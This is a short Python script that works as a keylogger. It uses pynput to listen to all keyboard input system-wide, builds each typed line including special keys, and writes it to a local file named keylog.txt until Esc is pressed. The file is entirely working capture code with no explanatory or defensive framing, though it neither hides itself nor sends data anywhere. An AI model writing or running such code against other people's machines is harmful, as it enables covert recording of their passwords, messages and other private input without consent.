from pynput.keyboard import Key, KeyCode, Listener

def write_line():
    global line
    fp=open("keylog.txt","a")
    fp.write(line)
    fp.close()
    line = ''

def get_key_name(key):
    if isinstance(key, KeyCode):
        return key.char.strip("'")
    else:
        return '[' + str(key) + ']'

def on_press(key):
    global line
    if key == Key.enter:
        write_line()
    elif key == Key.esc:
        write_line()
        return False
    elif key == Key.backspace:
        line = line[:-1]
    else:
        line += get_key_name(key)

line = ''
fp=open("keylog.txt","w")
fp.write(line)
fp.close()
with Listener(on_press=on_press) as listener:
    listener.join()
